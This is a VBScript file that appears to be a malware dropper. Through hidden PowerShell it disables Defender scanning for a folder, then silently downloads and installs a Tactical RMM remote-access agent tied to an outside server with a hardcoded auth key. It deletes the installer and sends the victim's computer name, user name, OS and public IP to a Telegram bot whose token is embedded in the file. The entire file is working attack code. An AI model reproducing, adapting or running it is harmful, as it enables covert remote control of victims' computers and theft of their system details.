' ================== CONFIG ==================
Dim BOT_TOKEN, CHAT_ID, api, auth, clientid, siteid, downloadlink

BOT_TOKEN    = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
CHAT_ID      = "8345342738"

api          = "https://api.temo.click"
auth         = "fc4dee919334a958bb66f92a2e1871e83e5193bb36872eca4d36bd54a9fdef44"
clientid     = "1"
siteid       = "1"
downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe"

' ================== OBJECTS ==================
Dim objShell, intReturn
Set objShell = CreateObject("WScript.Shell")

' ================== INSTALLATION PROCESS ==================
psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& {" & _
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
"$OutPath = Join-Path $env:TMP 'agent_setup.exe'; " & _
"if (-not (Get-Service tacticalrmm -ErrorAction SilentlyContinue)) { " & _
"Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' -ErrorAction SilentlyContinue; " & _
"Invoke-WebRequest -Uri '" & downloadlink & "' -OutFile $OutPath; " & _
"Start-Process -FilePath $OutPath -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES' -Wait; " & _
"Start-Process -FilePath 'C:\Program Files\TacticalAgent\tacticalrmm.exe' -ArgumentList '-m install --api " & api & " --client-id " & clientid & " --site-id " & siteid & " --agent-type server --auth " & auth & "' -WindowStyle Hidden -Wait; " & _
"Remove-Item $OutPath -ErrorAction SilentlyContinue; " & _
"} }"""

' Run Installation
intReturn = objShell.Run(psCommand, 0, True)

' ================== TELEGRAM NOTIFICATION ==================
Dim notifyCmd
notifyCmd = _
    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
    "$ip=(Invoke-RestMethod 'https://api.ipify.org');" & _
    "$os=(Get-CimInstance Win32_OperatingSystem).Caption;" & _
    "$dt=Get-Date -Format 'yyyy-MM-dd HH:mm:ss';" & _
    "$msg='=== TACTICAL RMM INSTALLED ==='+[char]10+" & _
         "'PC: '+$env:COMPUTERNAME+[char]10+" & _
         "'User: '+$env:USERNAME+[char]10+" & _
         "'OS: '+$os+[char]10+" & _
         "'IP: '+$ip+[char]10+" & _
         "'Status: Success'+[char]10+" & _
         "'Time: '+$dt;" & _
    "$body=@{chat_id='" & CHAT_ID & "';text=$msg};" & _
    "Invoke-RestMethod -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -Body $body"""

' Send Notification
objShell.Run notifyCmd, 0, False





